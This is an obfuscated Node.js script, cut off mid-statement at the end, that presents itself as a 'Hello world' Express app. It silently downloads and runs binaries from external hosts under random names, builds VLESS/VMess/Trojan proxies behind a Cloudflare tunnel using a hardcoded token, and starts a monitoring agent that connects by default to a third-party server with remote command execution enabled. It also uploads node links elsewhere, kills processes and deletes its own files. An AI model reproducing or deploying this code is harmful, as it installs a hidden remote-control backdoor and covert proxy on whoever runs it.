const _0xfa4567=_0x4e68;function _0x4e68(_0x513cec,_0x286104){const _0x65dd9f=_0x4dec();return _0x4e68=function(_0x2ecbdb,_0x3fc661){_0x2ecbdb=_0x2ecbdb-0x96;let _0x3dc030=_0x65dd9f[_0x2ecbdb];return _0x3dc030;},_0x4e68(_0x513cec,_0x286104);}(function(_0x4b07b7,_0x1fc4f0){const _0x3bb9f1=_0x4e68,_0x396136=_0x4b07b7();while(!![]){try{const _0xc2fd07=parseInt(_0x3bb9f1(0x9f))/0x1+parseInt(_0x3bb9f1(0xde))/0x2+parseInt(_0x3bb9f1(0x13e))/0x3+-parseInt(_0x3bb9f1(0xfd))/0x4*(-parseInt(_0x3bb9f1(0x117))/0x5)+-parseInt(_0x3bb9f1(0xff))/0x6+parseInt(_0x3bb9f1(0xe7))/0x7*(parseInt(_0x3bb9f1(0x139))/0x8)+parseInt(_0x3bb9f1(0xd0))/0x9*(-parseInt(_0x3bb9f1(0xe6))/0xa);if(_0xc2fd07===_0x1fc4f0)break;else _0x396136['push'](_0x396136['shift']());}catch(_0x3e2928){_0x396136['push'](_0x396136['shift']());}}}(_0x4dec,0x7140f));const _0xbc7f0f=(function(){let _0x3c93d6=!![];return function(_0x57f335,_0x5a7f5c){const _0x55ca62=_0x3c93d6?function(){const _0x46cec7=_0x4e68;if(_0x5a7f5c){const _0x2a40d6=_0x5a7f5c[_0x46cec7(0x14b)](_0x57f335,arguments);return _0x5a7f5c=null,_0x2a40d6;}}:function(){};return _0x3c93d6=![],_0x55ca62;};}()),_0x5b356e=_0xbc7f0f(this,function(){const _0x1eda11=_0x4e68;return _0x5b356e[_0x1eda11(0xa8)]()[_0x1eda11(0xaf)](_0x1eda11(0x9e))['toString']()[_0x1eda11(0x145)](_0x5b356e)['search'](_0x1eda11(0x9e));});_0x5b356e();const _0x3fc661=(function(){let _0x5de7a5=!![];return function(_0x504617,_0x4a1a8c){const _0x5f3dc3=_0x5de7a5?function(){const _0x4a3ee6=_0x4e68;if(_0x4a1a8c){const _0x556c24=_0x4a1a8c[_0x4a3ee6(0x14b)](_0x504617,arguments);return _0x4a1a8c=null,_0x556c24;}}:function(){};return _0x5de7a5=![],_0x5f3dc3;};}()),_0x2ecbdb=_0x3fc661(this,function(){const _0x3b1d20=_0x4e68,_0x22f554=function(){const _0x50b638=_0x4e68;let _0x50cdd5;try{_0x50cdd5=Function(_0x50b638(0xeb)+_0x50b638(0xbd)+');')();}catch(_0x2e6d0e){_0x50cdd5=window;}return _0x50cdd5;},_0x4933b7=_0x22f554(),_0x48f705=_0x4933b7[_0x3b1d20(0x131)]=_0x4933b7[_0x3b1d20(0x131)]||{},_0x37f6b4=['log','warn',_0x3b1d20(0xb5),'error',_0x3b1d20(0x116),_0x3b1d20(0x101),_0x3b1d20(0x149)];for(let _0x3aebfe=0x0;_0x3aebfe<_0x37f6b4[_0x3b1d20(0x148)];_0x3aebfe++){const _0xb0f6a7=_0x3fc661[_0x3b1d20(0x145)][_0x3b1d20(0x11a)][_0x3b1d20(0xb0)](_0x3fc661),_0x46dde8=_0x37f6b4[_0x3aebfe],_0x333fde=_0x48f705[_0x46dde8]||_0xb0f6a7;_0xb0f6a7[_0x3b1d20(0x12f)]=_0x3fc661[_0x3b1d20(0xb0)](_0x3fc661),_0xb0f6a7[_0x3b1d20(0xa8)]=_0x333fde['toString'][_0x3b1d20(0xb0)](_0x333fde),_0x48f705[_0x46dde8]=_0xb0f6a7;}});_0x2ecbdb();const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0xfa4567(0xf6)),{promisify}=require(_0xfa4567(0x133)),exec=promisify(require('child_process')[_0xfa4567(0x10f)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0xfa4567(0x124)]['UPLOAD_URL']||'',PROJECT_URL=process[_0xfa4567(0x124)][_0xfa4567(0xe2)]||'',AUTO_ACCESS=process[_0xfa4567(0x124)][_0xfa4567(0x134)]||!![],FILE_PATH=process[_0xfa4567(0x124)][_0xfa4567(0xa7)]||_0xfa4567(0x14a),SUB_PATH=process[_0xfa4567(0x124)]['SUB_PATH']||_0xfa4567(0xec),PORT=process[_0xfa4567(0x124)][_0xfa4567(0xfc)]||process[_0xfa4567(0x124)][_0xfa4567(0x13f)]||0xbb8,UUID=process['env'][_0xfa4567(0x144)]||'0c524a06-80a4-4cb2-809a-8751c7ee4000',NEZHA_SERVER=process[_0xfa4567(0x124)][_0xfa4567(0x12c)]||_0xfa4567(0xd9),NEZHA_PORT=process[_0xfa4567(0x124)][_0xfa4567(0xcb)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||_0xfa4567(0x114),ARGO_DOMAIN=process[_0xfa4567(0x124)][_0xfa4567(0xaa)]||_0xfa4567(0xb4),ARGO_AUTH=process[_0xfa4567(0x124)]['ARGO_AUTH']||_0xfa4567(0x127),ARGO_PORT=process[_0xfa4567(0x124)][_0xfa4567(0x106)]||0x1f41,CFIP=process[_0xfa4567(0x124)][_0xfa4567(0xb8)]||_0xfa4567(0x11c),CFPORT=process['env'][_0xfa4567(0xda)]||0x1bb,NAME=process[_0xfa4567(0x124)]['NAME']||_0xfa4567(0xab);!fs[_0xfa4567(0x9d)](FILE_PATH)?(fs[_0xfa4567(0x102)](FILE_PATH),console[_0xfa4567(0xf1)](FILE_PATH+'\x20is\x20created')):console[_0xfa4567(0xf1)](FILE_PATH+_0xfa4567(0xcf));function generateRandomName(){const _0x2b2f38=_0xfa4567,_0x74b14c=_0x2b2f38(0x12d);let _0x2d2721='';for(let _0x4f8e8c=0x0;_0x4f8e8c<0x6;_0x4f8e8c++){_0x2d2721+=_0x74b14c[_0x2b2f38(0xc7)](Math[_0x2b2f38(0x11f)](Math[_0x2b2f38(0xf9)]()*_0x74b14c[_0x2b2f38(0x148)]));}return _0x2d2721;}function _0x4dec(){const _0x632fcd=['base64','direct','443','Error\x20executing\x20command:\x20','path','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','writeFileSync','random','application/json','\x0aclient_secret:\x20','SERVER_PORT','548776bXfLoC','Unhandled\x20error\x20in\x20startserver:','1027362ZnflWP','/trojan-argo','table','mkdirSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','readFileSync','https://amd64.ssss.nyc.mn/v1','ARGO_PORT','https://oooo.serv00.net/add-url','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','tls','Empowerment\x20success\x20for\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','8443','sub.txt','pop','exec','2087','&fp=firefox&type=ws&host=','amd','&path=%2Ftrojan-argo%3Fed%3D2560#','uxsBJKlaAGM0vzvyVUMF897De2rv9anu','npm\x20running\x20error:\x20','exception','30uQcUJf','unshift','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','prototype','\x0a\x20\x20\x20\x20','104.18.4.250','https://arm64.ssss.nyc.mn/bot','forEach','floor','send','tcp','/vmess-argo?ed=2560','ArgoDomain:','env','fileName','Nodes\x20uploaded\x20successfully','eyJhIjoiZTNlYmU5NDY1NjJjOGZjMjBmYzg4Y2U5MGJlODRjYTMiLCJ0IjoiM2Q0MWM5ODItOGE3Mi00MDQ0LWJiMDktNWZhNzdkMGMyM2M0IiwicyI6Ik1URXpOMlJsWmpndE9EWmxOQzAwT1daakxXRTJZV1F0TXpsa016QXlNbU5tTXpCayJ9','split','2053','catch','nohup\x20','NEZHA_SERVER','abcdefghijklmnopqrstuvwxyz','block','__proto__','win32','console','/sub.txt\x20saved\x20successfully','util','AUTO_ACCESS','true','match','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','127.0.0.1','8FAkovo','\x20is\x20running','\x20>/dev/null\x202>&1','map','error','429039wYOEKq','PORT','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','/dev/null','\x20-p\x20','clear','UUID','constructor','?security=tls&sni=','tunnel.json','length','trace','./tmp','apply','automatic\x20access\x20task\x20added\x20successfully','aarch64','/tunnel.yml\x20run','quic','https://amd64.ssss.nyc.mn/agent','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','&path=%2Fvless-argo%3Fed%3D2560#','TunnelSecret','\x20>/dev/null\x202>&1\x20&','\x20failed:\x20','close','boot.log','post','existsSync','(((.+)+)+)+$','14534DsjzvK','unlinkSync','\x0a\x20\x20\x0avmess://','stream','from','\x20successfully','join','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','FILE_PATH','toString','trojan','ARGO_DOMAIN','Phala','firefox','\x20-c\x20\x22','includes','search','bind','Subscription\x20uploaded\x20successfully','https+local://8.8.8.8/dns-query','message','phala.jianxian.nyc.mn','info','?encryption=none&security=tls&sni=','arm64','CFIP','Add\x20automatic\x20access\x20task\x20faild:\x20','Empowerment\x20failed\x20for\x20','list.txt','2096','{}.constructor(\x22return\x20this\x22)(\x20)','finish','tunnel.yml','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','arm','https://arm64.ssss.nyc.mn/v1','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','--tls','Error\x20in\x20startserver:','pkill\x20-f\x20\x22[','charAt','has','Download\x20','freedom','NEZHA_PORT','taskkill\x20/f\x20/im\x20','\x22\x20>\x20/dev/null\x202>&1','readdirSync','\x20already\x20exists','54TEftvU','\x0a\x20\x20\x0atrojan://','App\x20is\x20running','false','substring','set','status','get','/api/add-nodes','jianxian.apkk.cloudns.org:56880','CFPORT','https://arm64.ssss.nyc.mn/web','Hello\x20world!','\x0a\x20\x20credentials-file:\x20','376622bxIkRq','2083','none','http','PROJECT_URL','blackhole','\x20-c\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','1994110dBcxSs','4637906pPPxkC','/vless-argo','test','pipe','return\x20(function()\x20','jianxianapp','push','basename','stringify','utf-8','log'];_0x4dec=function(){return _0x632fcd;};return _0x4dec();}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0xfa4567(0xa5)](FILE_PATH,npmName),phpPath=path[_0xfa4567(0xa5)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0xfa4567(0xa5)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0xfa4567(0x10d)),listPath=path[_0xfa4567(0xa5)](FILE_PATH,_0xfa4567(0xbb)),bootLogPath=path[_0xfa4567(0xa5)](FILE_PATH,_0xfa4567(0x9b)),configPath=path[_0xfa4567(0xa5)](FILE_PATH,'config.json');function deleteNodes(){const _0x134e2b=_0xfa4567;try{if(!UPLOAD_URL)return;if(!fs[_0x134e2b(0x9d)](subPath))return;let _0x18bde8;try{_0x18bde8=fs[_0x134e2b(0x104)](subPath,_0x134e2b(0xf0));}catch{return null;}const _0x174936=Buffer[_0x134e2b(0xa3)](_0x18bde8,_0x134e2b(0xf2))[_0x134e2b(0xa8)](_0x134e2b(0xf0)),_0x5c8f04=_0x174936[_0x134e2b(0x128)]('\x0a')['filter'](_0x3f94dc=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x134e2b(0xe9)](_0x3f94dc));if(_0x5c8f04[_0x134e2b(0x148)]===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x5c8f04}),{'headers':{'Content-Type':_0x134e2b(0xfa)}})[_0x134e2b(0x12a)](_0x257f4a=>{return null;}),null;}catch(_0x2724e6){return null;}}function cleanupOldFiles(){const _0x2b3dfb=_0xfa4567;try{const _0x4e1eaa=fs[_0x2b3dfb(0xce)](FILE_PATH);_0x4e1eaa['forEach'](_0x2f4998=>{const _0x5f0dd3=_0x2b3dfb,_0x3a68f1=path[_0x5f0dd3(0xa5)](FILE_PATH,_0x2f4998);try{const _0xb0d03c=fs['statSync'](_0x3a68f1);_0xb0d03c['isFile']()&&fs[_0x5f0dd3(0xa0)](_0x3a68f1);}catch(_0x619c52){}});}catch(_0x29d179){}}app['get']('/',function(_0x600afd,_0xe1f555){const _0x2ceba3=_0xfa4567;_0xe1f555[_0x2ceba3(0x120)](_0x2ceba3(0xdc));});async function generateConfig(){const _0x30382b=_0xfa4567,_0x137108={'log':{'access':_0x30382b(0x141),'error':_0x30382b(0x141),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x30382b(0xe0),'fallbacks':[{'dest':0xbb9},{'path':_0x30382b(0xe8),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x30382b(0x100),'dest':0xbbc}]},'streamSettings':{'network':_0x30382b(0x121)}},{'port':0xbb9,'listen':_0x30382b(0x138),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x30382b(0x121),'security':_0x30382b(0xe0)}},{'port':0xbba,'listen':_0x30382b(0x138),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x30382b(0xe0)},'streamSettings':{'network':'ws','security':_0x30382b(0xe0),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x30382b(0x109),_0x30382b(0x14f)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x30382b(0x138),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x30382b(0xe1),_0x30382b(0x109),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x30382b(0x138),'protocol':_0x30382b(0xa9),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x30382b(0xe0),'wsSettings':{'path':_0x30382b(0x100)}},'sniffing':{'enabled':!![],'destOverride':[_0x30382b(0xe1),'tls',_0x30382b(0x14f)],'metadataOnly':![]}}],'dns':{'servers':[_0x30382b(0xb2)]},'outbounds':[{'protocol':_0x30382b(0xca),'tag':_0x30382b(0xf3)},{'protocol':_0x30382b(0xe3),'tag':_0x30382b(0x12e)}]};fs[_0x30382b(0xf8)](path[_0x30382b(0xa5)](FILE_PATH,'config.json'),JSON[_0x30382b(0xef)](_0x137108,null,0x2));}function getSystemArchitecture(){const _0x41f15=_0xfa4567,_0x1125f1=os['arch']();return _0x1125f1===_0x41f15(0xc1)||_0x1125f1===_0x41f15(0xb7)||_0x1125f1===_0x41f15(0x14d)?_0x41f15(0xc1):_0x41f15(0x112);}function downloadFile(_0x47aafb,_0x3dee50,_0x26f1bd){const _0xdd2ee7=_0xfa4567,_0xfa9e81=_0x47aafb;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x265c1c=fs['createWriteStream'](_0xfa9e81);axios({'method':_0xdd2ee7(0xd7),'url':_0x3dee50,'responseType':_0xdd2ee7(0xa2)})['then'](_0x492c5b=>{const _0x571087=_0xdd2ee7;_0x492c5b['data'][_0x571087(0xea)](_0x265c1c),_0x265c1c['on'](_0x571087(0xbe),()=>{const _0x1c9607=_0x571087;_0x265c1c[_0x1c9607(0x9a)](),console[_0x1c9607(0xf1)](_0x1c9607(0xc9)+path[_0x1c9607(0xee)](_0xfa9e81)+_0x1c9607(0xa4)),_0x26f1bd(null,_0xfa9e81);}),_0x265c1c['on']('error',_0x82d91b=>{const _0xfc5db9=_0x571087;fs['unlink'](_0xfa9e81,()=>{});const _0x10df43=_0xfc5db9(0xc9)+path[_0xfc5db9(0xee)](_0xfa9e81)+'\x20failed:\x20'+_0x82d91b[_0xfc5db9(0xb3)];console[_0xfc5db9(0x13d)](_0x10df43),_0x26f1bd(_0x10df43);});})[_0xdd2ee7(0x12a)](_0x36c693=>{const _0x17b82b=_0xdd2ee7,_0x73cd9b='Download\x20'+path[_0x17b82b(0xee)](_0xfa9e81)+_0x17b82b(0x99)+_0x36c693['message'];console[_0x17b82b(0x13d)](_0x73cd9b),_0x26f1bd(_0x73cd9b);});}async function downloadFilesAndRun(){const _0x594725=_0xfa4567,_0x19637e=getSystemArchitecture(),_0x4c3f49=getFilesForArchitecture(_0x19637e);if(_0x4c3f49[_0x594725(0x148)]===0x0){console['log'](_0x594725(0x137));return;}const _0x3a08d4=_0x4c3f49[_0x594725(0x13c)](_0xd98f5f=>{return new Promise((_0x5bbc5c,_0x48491c)=>{const _0x4f5c52=_0x4e68;downloadFile(_0xd98f5f[_0x4f5c52(0x125)],_0xd98f5f['fileUrl'],(_0x41f664,_0x7ac8b4)=>{_0x41f664?_0x48491c(_0x41f664):_0x5bbc5c(_0x7ac8b4);});});});try{await Promise['all'](_0x3a08d4);}catch(_0x104f77){console[_0x594725(0x13d)]('Error\x20downloading\x20files:',_0x104f77);return;}function _0x44ea9c(_0x5768d5){const _0x3c1038=_0x594725,_0x13bc40=0x1fd;_0x5768d5[_0x3c1038(0x11e)](_0x1ab60b=>{fs['existsSync'](_0x1ab60b)&&fs['chmod'](_0x1ab60b,_0x13bc40,_0x26f6b7=>{const _0x3fe20a=_0x4e68;_0x26f6b7?console[_0x3fe20a(0x13d)](_0x3fe20a(0xba)+_0x1ab60b+':\x20'+_0x26f6b7):console['log'](_0x3fe20a(0x10a)+_0x1ab60b+':\x20'+_0x13bc40['toString'](0x8));});});}const _0x6a87fe=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x44ea9c(_0x6a87fe);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x6e08b1=NEZHA_SERVER[_0x594725(0xae)](':')?NEZHA_SERVER[_0x594725(0x128)](':')[_0x594725(0x10e)]():'',_0x5d088d=new Set([_0x594725(0xf4),_0x594725(0x10c),_0x594725(0xbc),'2087',_0x594725(0xdf),_0x594725(0x129)]),_0x33e41a=_0x5d088d[_0x594725(0xc8)](_0x6e08b1)?_0x594725(0x135):_0x594725(0xd3),_0x491b2c=_0x594725(0xfb)+NEZHA_KEY+_0x594725(0x140)+NEZHA_SERVER+_0x594725(0xe5)+_0x33e41a+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x594725(0xf8)](path['join'](FILE_PATH,'config.yaml'),_0x491b2c);const _0x5ba684=_0x594725(0x12b)+phpPath+_0x594725(0xad)+FILE_PATH+_0x594725(0x119);try{await exec(_0x5ba684),console['log'](phpName+_0x594725(0x13a)),await new Promise(_0x35296c=>setTimeout(_0x35296c,0x3e8));}catch(_0x49dacb){console[_0x594725(0x13d)]('php\x20running\x20error:\x20'+_0x49dacb);}}else{let _0x3f69c7='';const _0x7795c8=[_0x594725(0xf4),_0x594725(0x10c),_0x594725(0xbc),_0x594725(0x110),_0x594725(0xdf),_0x594725(0x129)];_0x7795c8[_0x594725(0xae)](NEZHA_PORT)&&(_0x3f69c7=_0x594725(0xc4));const _0x2ec114=_0x594725(0x12b)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x594725(0x142)+NEZHA_KEY+'\x20'+_0x3f69c7+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2ec114),console[_0x594725(0xf1)](npmName+'\x20is\x20running'),await new Promise(_0x39b415=>setTimeout(_0x39b415,0x3e8));}catch(_0x2fd95b){console[_0x594725(0x13d)](_0x594725(0x115)+_0x2fd95b);}}}else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x386067=_0x594725(0x12b)+webPath+_0x594725(0xe4)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x386067),console[_0x594725(0xf1)](webName+'\x20is\x20running'),await new Promise(_0x5c9a1f=>setTimeout(_0x5c9a1f,0x3e8));}catch(_0x1bb3b3){console[_0x594725(0x13d)]('web\x20running\x20error:\x20'+_0x1bb3b3);}if(fs[_0x594725(0x9d)](botPath)){let _0x823ed9;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x823ed9=_0x594725(0xf7)+ARGO_AUTH;else ARGO_AUTH[_0x594725(0x136)](/TunnelSecret/)?_0x823ed9=_0x594725(0xc3)+FILE_PATH+_0x594725(0x14e):_0x823ed9=_0x594725(0x103)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x594725(0x12b)+botPath+'\x20'+_0x823ed9+_0x594725(0x98)),console[_0x594725(0xf1)](botName+_0x594725(0x13a)),await new Promise(_0x236627=>setTimeout(_0x236627,0x7d0));}catch(_0x523fcd){console[_0x594725(0x13d)](_0x594725(0xf5)+_0x523fcd);}}await new Promise(_0x3a1a8e=>setTimeout(_0x3a1a8e,0x1388));}function getFilesForArchitecture(_0x135f05){const _0x40cd5a=_0xfa4567;let _0x31b0dc;_0x135f05==='arm'?_0x31b0dc=[{'fileName':webPath,'fileUrl':_0x40cd5a(0xdb)},{'fileName':botPath,'fileUrl':_0x40cd5a(0x11d)}]:_0x31b0dc=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x487a32=_0x135f05===_0x40cd5a(0xc1)?'https://arm64.ssss.nyc.mn/agent':_0x40cd5a(0x150);_0x31b0dc[_0x40cd5a(0x118)]({'fileName':npmPath,'fileUrl':_0x487a32});}else{const _0x5c72fd=_0x135f05===_0x40cd5a(0xc1)?_0x40cd5a(0xc2):_0x40cd5a(0x105);_0x31b0dc[_0x40cd5a(0x118)]({'fileName':phpPath,'fileUrl':_0x5c72fd});}}return _0x31b0dc;}function argoType(){const _0x4a01db=_0xfa4567;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x4a01db(0xc0));return;}if(ARGO_AUTH[_0x4a01db(0xae)](_0x4a01db(0x97))){fs[_0x4a01db(0xf8)](path['join'](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x132e4d='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH['split']('\x22')[0xb]+_0x4a01db(0xdd)+path[_0x4a01db(0xa5)](FILE_PATH,_0x4a01db(0x147))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x4a01db(0x151)+ARGO_PORT+_0x4a01db(0x108);fs[_0x4a01db(0xf8)](path[_0x4a01db(0xa5)](FILE_PATH,_0x4a01db(0xbf)),_0x132e4d);}else console[_0x4a01db(0xf1)](_0x4a01db(0xa6));}argoType();async function extractDomains(){const _0x1d014f=_0xfa4567;let _0x361eea;if(ARGO_AUTH&&ARGO_DOMAIN)_0x361eea=ARGO_DOMAIN,console[_0x1d014f(0xf1)]('ARGO_DOMAIN:',_0x361eea),await _0x5ccf8d(_0x361eea);else try{const _0x122714=fs[_0x1d014f(0x104)](path['join'](FILE_PATH,_0x1d014f(0x9b)),'utf-8'),_0x59451a=_0x122714[_0x1d014f(0x128)]('\x0a'),_0x36a7f7=[];_0x59451a[_0x1d014f(0x11e)](_0x222553=>{const _0xfe5ea0=_0x1d014f,_0x1c9d15=_0x222553['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1c9d15){const _0x4ab697=_0x1c9d15[0x1];_0x36a7f7[_0xfe5ea0(0xed)](_0x4ab697);}});if(_0x36a7f7[_0x1d014f(0x148)]>0x0)_0x361eea=_0x36a7f7[0x0],console[_0x1d014f(0xf1)](_0x1d014f(0x123),_0x361eea),await _0x5ccf8d(_0x361eea);else{console[_0x1d014f(0xf1)](_0x1d014f(0x10b)),fs[_0x1d014f(0xa0)](path[_0x1d014f(0xa5)](FILE_PATH,_0x1d014f(0x9b)));async function _0x557e9b(){const _0xd80eb5=_0x1d014f;try{process['platform']===_0xd80eb5(0x130)?await exec(_0xd80eb5(0xcc)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0xd80eb5(0xc6)+botName['charAt'](0x0)+']'+botName[_0xd80eb5(0xd4)](0x1)+_0xd80eb5(0xcd));}catch(_0x2d76d8){}}_0x557e9b(),await new Promise(_0x4d0993=>setTimeout(_0x4d0993,0xbb8));const _0x4877af='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x1d014f(0x12b)+botPath+'\x20'+_0x4877af+'\x20>/dev/null\x202>&1\x20&'),console[_0x1d014f(0xf1)](botName+_0x1d014f(0x13a)),await new Promise(_0x4aadf1=>setTimeout(_0x4aadf1,0xbb8)),await extractDomains();}catch(_0x1614b1){console[_0x1d014f(0x13d)]('Error\x20executing\x20command:\x20'+_0x1614b1);}}}catch(_0x9caa19){console[_0x1d014f(0x13d)]('Error\x20reading\x20boot.log:',_0x9caa19);}async function _0x5ccf8d(_0x4aac2d){const _0x806f6d=_0x1d014f,_0x727b37=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x806f6d(0xf0)}),_0x22419a=_0x727b37['trim'](),_0x3b16cb=NAME?NAME+'-'+_0x22419a:_0x22419a;return new Promise(_0x2f31f7=>{setTimeout(()=>{const _0x70d2a9=_0x4e68,_0x405041={'v':'2','ps':''+_0x3b16cb,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x70d2a9(0xe0),'net':'ws','type':_0x70d2a9(0xe0),'host':_0x4aac2d,'path':_0x70d2a9(0x122),'tls':'tls','sni':_0x4aac2d,'alpn':'','fp':_0x70d2a9(0xac)},_0x392028='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x70d2a9(0xb6)+_0x4aac2d+'&fp=firefox&type=ws&host='+_0x4aac2d+_0x70d2a9(0x96)+_0x3b16cb+_0x70d2a9(0xa1)+Buffer[_0x70d2a9(0xa3)](JSON[_0x70d2a9(0xef)](_0x405041))[_0x70d2a9(0xa8)](_0x70d2a9(0xf2))+_0x70d2a9(0xd1)+UUID+'@'+CFIP+':'+CFPORT+_0x70d2a9(0x146)+_0x4aac2d+_0x70d2a9(0x111)+_0x4aac2d+_0x70d2a9(0x113)+_0x3b16cb+_0x70d2a9(0x11b);console[_0x70d2a9(0xf1)](Buffer[_0x70d2a9(0xa3)](_0x392028)[_0x70d2a9(0xa8)](_0x70d2a9(0xf2))),fs[_0x70d2a9(0xf8)](subPath,Buffer['from'](_0x392028)['toString']('base64')),console[_0x70d2a9(0xf1)](FILE_PATH+_0x70d2a9(0x132)),uploadNodes(),app[_0x70d2a9(0xd7)]('/'+SUB_PATH,(_0x5918bf,_0x4a56b1)=>{const _0x312230=_0x70d2a9,_0x3279ec=Buffer['from'](_0x392028)[_0x312230(0xa8)](_0x312230(0xf2));_0x4a56b1[_0x312230(0xd5)]('Content-Type','text/plain;\x20charset=utf-8'),_0x4a56b1[_0x312230(0x120)](_0x3279ec);}),_0x2f31f7(_0x392028);},0x7d0);});}}async function uploadNodes(){const _0x20bb72=_0xfa4567;if(UPLOAD_URL&&PROJECT_URL){const _0x36347b=PROJECT_URL+'/'+SUB_PATH,_0x37a7d5={'subscription':[_0x36347b]};try{const _0x15a82d=await axios[_0x20bb72(0x9c)](UPLOAD_URL+'/api/add-subscriptions',_0x37a7d5,{'headers':{'Content-Type':_0x20bb72(0xfa)}});return _0x15a82d&&_0x15a82d[_0x20bb72(0xd6)]===0xc8?(console[_0x20bb72(0xf1)](_0x20bb72(0xb1)),_0x15a82d):null;}catch(_0x173828){if(_0x173828['response']){if(_0x173828['response'][_0x20bb72(0xd6)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x20bb72(0x9d)](listPath))return;const _0x3189dc=fs['readFileSync'](listPath,_0x20bb72(0xf0)),_0x368ab2=_0x3189dc[_0x20bb72(0x128)]('\x0a')['filter'](_0x16a274=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x20bb72(0xe9)](_0x16a274));if(_0x368ab2[_0x20bb72(0x148)]===0x0)return;const _0x3fd383=JSON[_0x20bb72(0xef)]({'nodes':_0x368ab2});try{const _0x2d34f3=await axios[_0x20bb72(0x9c)](UPLOAD_URL+_0x20bb72(0xd8),_0x3fd383,{'headers':{'Content-Type':_0x20bb72(0xfa)}});return _0x2d34f3&&_0x2d34f3[_0x20bb72(0xd6)]===0xc8?(console['log'](_0x20bb72(0x126)),_0x2d34f3):null;}catch(_0x1a8c0e){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x11b9eb=_0x4e68,_0x15884a=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x15884a[_0x11b9eb(0xed)](npmPath);else 